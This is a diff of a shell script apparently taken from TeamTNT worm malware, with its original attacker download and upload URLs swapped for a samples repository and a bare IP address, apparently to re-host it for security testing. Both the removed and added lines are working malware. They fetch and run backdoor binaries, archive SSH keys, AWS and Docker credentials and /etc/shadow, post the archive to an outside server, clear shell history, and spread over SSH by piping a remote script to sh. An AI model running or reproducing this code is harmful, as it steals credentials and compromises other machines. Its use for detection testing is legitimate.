@@ -12,8 +12,8 @@ echo "replay .. i know this server ..."
 exit
 fi
 
-PWNWITHTHISLINK="https://teamtnt.red/sh/ssh"
-RSAUPLOAD="https://teamtnt.red/only_for_stats/index.php"
+PWNWITHTHISLINK="https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot"
+RSAUPLOAD="http://152.67.166.153:8000"
 
 function setupmyapps(){
 	
@@ -41,7 +41,7 @@ REFERER=$(cat /etc/ssh/sshd_config|grep -v grep | grep "Port "| awk '{print $2}'
 WGETPARA="--max-redirect 5 --no-check-certificate --quiet"
 CURLPARA="-L --max-redirs 5 --insecure --silent"
 
-curl --referer $REFERER --user-agent TNTcurl $CURLPARA $GETFROM -o $PUTITTO || cur --referer $REFERER --user-agent TNTcurl $CURLPARA $GETFROM -o $PUTITTO || cdl --referer $REFERER --user-agent TNTcurl $CURLPARA $GETFROM -o $PUTITTO || TNTcurl --referer $REFERER --user-agent TNTcurl $CURLPARA $GETFROM -o $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wge --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wdl --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || TNTwget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO
+curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO ||  curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO
 
 }	
 
@@ -49,11 +49,11 @@ if [ -f "/bin/sbin" ]; then
 echo 'FOUND: sbin'
 else
 echo 'MISSING: sbin'
-loadthisfile http://kaiserfranz.cc/sbin /bin/sbin
+loadthisfile https://github.com/accuknox/samples/raw/main/tntbot/default.jpg /bin/sbin
 chmod +x /bin/sbin
 /bin/sbin
 if [ ! -f "/bin/sbin" ]; then
-loadthisfile http://85.214.149.236:443/sugarcrm/themes/default/images/default.jpg /dev/shm/sbin
+loadthisfile https://github.com/accuknox/samples/raw/main/tntbot/default.jpg /dev/shm/sbin
 chmod +x /dev/shm/sbin
 /dev/shm/sbin
 fi
@@ -63,7 +63,7 @@ if [ -f "/usr/bin/tshd" ]; then
 echo 'FOUND: tshd'
 else
 echo 'MISSING: tshd'
-loadthisfile http://85.214.149.236:443/sugarcrm/themes/default/images/tshd.jpg /usr/bin/tshd
+loadthisfile https://github.com/accuknox/samples/raw/main/tntbot/tshd.jpg /usr/bin/tshd
 chmod +x /usr/bin/tshd
 /usr/bin/tshd
 fi
@@ -72,7 +72,7 @@ if [ -f "/usr/bin/kube" ]; then
 echo 'FOUND: kube'
 else
 echo 'MISSING: kube'
-loadthisfile http://kaiserfranz.cc/ziggy_spread /usr/bin/kube
+loadthisfile https://github.com/accuknox/samples/raw/main/tntbot/ziggy_spread /usr/bin/kube
 chmod +x /usr/bin/kube
 /usr/bin/kube
 fi
@@ -81,7 +81,7 @@ if [ -f "/usr/bin/bioset" ]; then
 echo 'FOUND: bioset'
 else
 echo 'MISSING: bioset'
-loadthisfile http://85.214.149.236:443/sugarcrm/themes/default/images/bioset.jpg /usr/bin/bioset
+loadthisfile https://github.com/accuknox/samples/raw/main/tntbot/bioset.jpg /usr/bin/bioset
 chmod +x /usr/bin/bioset
 /usr/bin/bioset
 fi
@@ -109,7 +109,7 @@ mkdir /dev/shm/ -p 2>/dev/null
 
 tar cvzf /dev/shm/rsa.up.tar.gz /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/id_ed25519 /root/.ssh/id_ed25519.pub /root/.ssh/authorized_keys /root/.ssh/authorized_keys2 /root/.ssh/known_hosts /root/.bash_history /etc/hosts /home/*/.ssh/id_rsa /home/*/.ssh/id_rsa.pub /home/*/.ssh/id_ed25519 /home/*/.ssh/id_ed25519.pub /home/*/.ssh/authorized_keys /home/*/.ssh/authorized_keys2 /home/*/.ssh/known_hosts /home/*/.bash_history /root/.aws/credentials /root/.aws/config /home/*/.aws/credentials /home/*/.aws/config /root/.docker/config.json /home/*/.docker/config.json /etc/group /etc/passwd /etc/shadow /etc/gshadow
 	
-curl -F "userfile=@/dev/shm/rsa.up.tar.gz" $RSAUPLOAD 2>/dev/null
+curl -X POST $RSAUPLOAD/upload -F "files=@/dev/shm/rsa.up.tar.gz"  2>/dev/null 
 rm -f /dev/shm/rsa.up.tar.gz
 
 history -c
@@ -169,7 +169,7 @@ localgo() {
           chmod +r $key
           chmod 400 $key
           echo "$user@$host $key $sshp"
-          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "nohup $(curl -Ls $PWNWITHTHISLINK | sh || cur -Ls $PWNWITHTHISLINK | sh || cdl -Ls $PWNWITHTHISLINK | sh || wget -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wge -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wdl -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh);"
+          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "nohup $(curl -Ls $PWNWITHTHISLINK | sh || curl -Ls $PWNWITHTHISLINK | sh || curl -Ls $PWNWITHTHISLINK | sh || wget -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wge -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh || wdl -q --max-redirect=2 -O- $PWNWITHTHISLINK | sh);"
         done
       done
     done
